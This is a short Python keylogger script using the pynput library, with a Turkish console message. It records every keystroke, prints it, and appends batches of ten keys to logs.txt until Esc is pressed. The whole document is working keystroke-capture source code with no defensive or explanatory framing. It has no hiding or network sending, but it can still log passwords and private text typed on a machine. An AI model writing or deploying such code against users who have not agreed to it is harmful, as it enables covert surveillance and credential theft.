from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
    global keys, count
    keys.append(key)
    count += 1 # count = count + 1
    print("{0} tuşuna basıldı!".format(str(key)))

    if count >= 10:
        write_file(keys)
        keys = []
        count = 0

def write_file(keys):
    with open("logs.txt", "a") as file:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                file.write("\n")
            elif k.find("Key"):
                file.write(str(k))

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
